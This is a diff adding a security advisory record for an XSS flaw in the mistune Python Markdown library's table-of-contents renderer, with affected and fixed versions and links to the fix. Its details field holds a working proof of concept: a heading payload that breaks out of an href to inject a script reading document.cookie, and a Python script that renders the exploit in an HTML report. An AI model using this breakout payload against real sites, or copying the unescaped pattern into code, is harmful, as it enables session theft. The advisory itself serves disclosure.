@@ -1,0 +1,56 @@
+{
+  "id": "GHSA-6269-cqxg-mhhv",
+  "modified": "2026-05-14T16:56:24.676428Z",
+  "published": "2026-05-14T16:36:12Z",
+  "aliases": [
+    "CVE-2026-44898"
+  ],
+  "summary": "Mistune TOC Anchor Injection XSS",
+  "details": "## Summary\n`render_toc_ul()` builds a `\u003cul\u003e` table-of-contents tree from a list of `(level, id, text)` tuples. Both the `id` value (used as `href=\"#\u003cid\u003e\"`) and the `text` value (used as the visible link label) are inserted into `\u003ca\u003e` tags via a plain Python format string — with no HTML escaping applied to either value.\n\nWhen heading IDs are derived from user-supplied heading text (the standard use-case for readable slug anchors), an attacker can craft a heading whose text breaks out of the `href=\"#...\"` attribute context, injecting arbitrary HTML tags including `\u003cscript\u003e` blocks directly into the rendered TOC.\n\nThis vulnerability is closely related to H2 (unescaped `id=` in `heading()`): the same `heading_id` callback pattern that triggers H2 also populates the `toc_items` list that `render_toc_ul()` consumes, meaning both vulnerabilities fire simultaneously in a typical documentation setup.\n\n## Details\n**File:** `src/mistune/toc.py`\n\n```python\ndef render_toc_ul(toc):\n    ...\n    for level, k, text in toc:\n        # k   = heading id  (used verbatim as href fragment)\n        # text = heading text (used verbatim as link label)\n        item = '\u003ca href=\"#{}\"\u003e{}\u003c/a\u003e'.format(k, text)\n        # Neither k nor text is passed through escape() at any point\n```\n\nThe `k` and `text` values come directly from the `toc_items` list accumulated during parsing. If `k` contains `\"` or `\u003e`, the `href` attribute is broken. If `text` contains `\u003c`, raw tags are injected as the visible link content.\n\n## PoC\n**Step 1 — Establish the baseline (safe default IDs)**\n\nThe script creates a parser with `escape=True` and the default `add_toc_hook()` (no custom callback). The default hook assigns sequential numeric IDs that never contain user text:\n\n```python\nmd_safe = create_markdown(escape=True)\nadd_toc_hook(md_safe)\n\nbl_src = \"# Introduction\\n\\n## Installation\\n\"\n_, state = md_safe.parse(bl_src)\nbl_out = render_toc_ul(state.env.get(\"toc_items\", []))\n```\n\nOutput — clean, safe TOC:\n```html\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#toc_1\"\u003eIntroduction\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#toc_2\"\u003eInstallation\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n```\n\n**Step 2 — Enable the vulnerable `heading_id` callback**\n\nRegister a callback that returns the raw heading text as the ID. This is the standard slug-based anchor pattern used by documentation generators:\n\n```python\ndef raw_id(token, index):\n    return token.get(\"text\", \"\")\n\nmd_vuln = create_markdown(escape=True)\nadd_toc_hook(md_vuln, heading_id=raw_id)\n```\n\n**Step 3 — Craft the exploit payload**\n\nConstruct a heading whose text terminates the `href=\"#...\"` attribute and injects a `\u003cscript\u003e` block followed by a dangling `\u003ca href=\"` to absorb the closing `\"\u003e` that `render_toc_ul` appends:\n\n```\n## x\"\u003e\u003cscript\u003ealert(document.cookie)\u003c/script\u003e\u003ca href=\"\n```\n\nWhen `raw_id` processes this heading, it returns the entire text as the ID: `x\"\u003e\u003cscript\u003ealert(document.cookie)\u003c/script\u003e\u003ca href=\"`.\n\n**Step 4 — Observe script injection in the TOC output**\n\n```python\nex_src = '## x\"\u003e\u003cscript\u003ealert(document.cookie)\u003c/script\u003e\u003ca href=\"\\n'\n_, state = md_vuln.parse(ex_src)\nex_out = render_toc_ul(state.env.get(\"toc_items\", []))\n```\n\n`render_toc_ul()` formats the malicious ID directly into the `\u003ca href\u003e`:\n\n```python\n'\u003ca href=\"#{}\"\u003e{}\u003c/a\u003e'.format(k, text)\n# becomes:\n'\u003ca href=\"#x\"\u003e\u003cscript\u003ealert(document.cookie)\u003c/script\u003e\u003ca href=\"\"\u003e...\u003ca/\u003e'\n```\n\nActual output:\n```html\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#x\"\u003e\u003cscript\u003ealert(document.cookie)\u003c/script\u003e\u003ca href=\"\"\u003ex\u0026quot;\u0026gt;\u0026lt;script\u0026gt;alert(document.cookie)\u0026lt;/script\u0026gt;\u0026lt;a href=\u0026quot;\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n```\n\nThe `\u003cscript\u003e` block is live in the document. Note that the anchor *label* (`text`) is escaped correctly by mistune's inline renderer before it reaches `toc_items`, but `k` (the heading ID) is not escaped anywhere.\n\n### Script\n\nI have built a script that you can use to verify this. It creates a HTML page showing the bypass so that you can see it render in the browser.\n\n```python\n#!/usr/bin/env python3\n\"\"\"H4: render_toc_ul() puts raw heading ID into \u003ca href\u003e without escaping.\"\"\"\nimport os, html as h\nfrom mistune import create_markdown\nfrom mistune.toc import add_toc_hook, render_toc_ul\n\ndef raw_id(token, index):\n    return token.get(\"text\", \"\")\n\n# --- baseline ---\nmd_safe = create_markdown(escape=True)\nadd_toc_hook(md_safe)\n\nbl_file = \"baseline_h4.md\"\nbl_src  = \"# Introduction\\n\\n## Installation\\n\"\nwith open(os.path.join(os.getcwd(), bl_file), \"w\") as f:\n    f.write(bl_src)\n_, state = md_safe.parse(bl_src)\nbl_out = render_toc_ul(state.env.get(\"toc_items\", []))\n\nprint(f\"[{bl_file}]\\n{bl_src}\")\nprint(\"[toc output — safe]\")\nprint(bl_out)\n\n# --- exploit ---\nmd_vuln = create_markdown(escape=True)\nadd_toc_hook(md_vuln, heading_id=raw_id)\n\nex_file = \"exploit_h4.md\"\nex_src  = '## x\"\u003e\u003cscript\u003ealert(document.cookie)\u003c/script\u003e\u003ca href=\"\\n'\nwith open(os.path.join(os.getcwd(), ex_file), \"w\") as f:\n    f.write(ex_src)\n_, state = md_vuln.parse(ex_src)\nex_out = render_toc_ul(state.env.get(\"toc_items\", []))\n\nprint(f\"[{ex_file}]\\n{ex_src}\")\nprint(\"[toc output — script injected via href breakout]\")\nprint(ex_out)\n\n# --- HTML report ---\nCSS = \"\"\"\nbody{font-family:-apple-system,sans-serif;max-width:1200px;margin:40px auto;background:#f0f0f0;color:#111;padding:0 24px}\nh1{font-size:1.3em;border-bottom:3px solid #333;padding-bottom:8px;margin-bottom:4px}\np.desc{color:#555;font-size:.9em;margin-top:6px}\n.case{margin:24px 0;border-radius:8px;overflow:hidden;border:1px solid #ccc;box-shadow:0 1px 4px rgba(0,0,0,.1)}\n.case-header{padding:10px 16px;font-weight:bold;font-family:monospace;font-size:.85em}\n.baseline .case-header{background:#d1fae5;color:#065f46}\n.exploit  .case-header{background:#fee2e2;color:#7f1d1d}\n.panels{display:grid;grid-template-columns:1fr 1fr;background:#fff}\n.panel{padding:16px}\n.panel+.panel{border-left:1px solid #eee}\n.panel h3{margin:0 0 8px;font-size:.68em;color:#888;text-transform:uppercase;letter-spacing:.07em}\npre{margin:0;padding:10px;background:#f6f6f6;border:1px solid #e0e0e0;border-radius:4px;font-size:.78em;white-space:pre-wrap;word-break:break-all}\n.rlabel{font-size:.68em;color:#aaa;margin:10px 0 4px;font-family:monospace}\n.rendered{padding:12px;border:1px dashed #ccc;border-radius:4px;min-height:20px;background:#fff;font-size:.9em}\n\"\"\"\n\ndef case(kind, label, filename, src, out):\n    return f\"\"\"\n\u003cdiv class=\"case {kind}\"\u003e\n  \u003cdiv class=\"case-header\"\u003e{'BASELINE' if kind=='baseline' else 'EXPLOIT'} — {h.escape(label)}\u003c/div\u003e\n  \u003cdiv class=\"panels\"\u003e\n    \u003cdiv class=\"panel\"\u003e\n      \u003ch3\u003eInput — {h.escape(filename)}\u003c/h3\u003e\n      \u003cpre\u003e{h.escape(src)}\u003c/pre\u003e\n    \u003c/div\u003e\n    \u003cdiv class=\"panel\"\u003e\n      \u003ch3\u003eTOC output — HTML source\u003c/h3\u003e\n      \u003cpre\u003e{h.escape(out)}\u003c/pre\u003e\n      \u003cdiv class=\"rlabel\"\u003e↓ rendered in browser\u003c/div\u003e\n      \u003cdiv class=\"rendered\"\u003e{out}\u003c/div\u003e\n    \u003c/div\u003e\n  \u003c/div\u003e\n\u003c/div\u003e\"\"\"\n\npage = f\"\"\"\u003c!DOCTYPE html\u003e\u003chtml lang=\"en\"\u003e\u003chead\u003e\u003cmeta charset=\"UTF-8\"\u003e\n\u003ctitle\u003eH4 — TOC XSS\u003c/title\u003e\u003cstyle\u003e{CSS}\u003c/style\u003e\u003c/head\u003e\u003cbody\u003e\n\u003ch1\u003eH4 — TOC render_toc_ul() XSS\u003c/h1\u003e\n\u003cp class=\"desc\"\u003erender_toc_ul() in toc.py uses '\u0026lt;a href=\"#{{}}\"\u0026gt;{{}}\u0026lt;/a\u0026gt;'.format(k, text) —\nneither k (the heading ID) nor text is escaped before insertion.\u003c/p\u003e\n{case(\"baseline\", \"Normal headings → sequential IDs → clean TOC links\", bl_file, bl_src, bl_out)}\n{case(\"exploit\",  \"Malicious heading ID breaks out of href='#...' → script injected\", ex_file, ex_src, ex_out)}\n\u003c/body\u003e\u003c/html\u003e\"\"\"\n\nout_path = os.path.join(os.getcwd(), \"report_h4.html\")\nwith open(out_path, \"w\") as f:\n    f.write(page)\nprint(f\"\\n[report] {out_path}\")\n```\n\nExample usage:\n```bash\npython poc.py\n```\n\nOnce you run the script, open `report_h4.html` in the browser and observe the behaviour.\n\n## Impact\n| Dimension        | Assessment |\n|------------------|-----------|\n| **Confidentiality** | JavaScript execution; attacker can exfiltrate session cookies and any data accessible from the page's origin |\n| **Integrity**    | Arbitrary DOM manipulation, phishing form injection, forced redirects |\n| **Availability** | Page crash or freeze available as secondary effect |\n\n**Risk context:** TOC generation is a rendering step that often happens in a different template layer from the main body render, potentially reviewed separately and trusted implicitly. Vulnerabilities in TOC output are frequently overlooked in code review. Combined with H2, an attacker exploiting this via a single malicious heading simultaneously injects into both the heading element and the TOC anchor.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "mistune",
+        "purl": "pkg:pypi/mistune"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "3.2.0"
+            },
+            {
+              "fixed": "3.2.1"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "3.2.0"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-6269-cqxg-mhhv/GHSA-6269-cqxg-mhhv.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/lepture/mistune/security/advisories/GHSA-6269-cqxg-mhhv"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/lepture/mistune/commit/04880a0"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/lepture/mistune"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/lepture/mistune/releases/tag/v3.2.1"
+    }
+  ]
+}
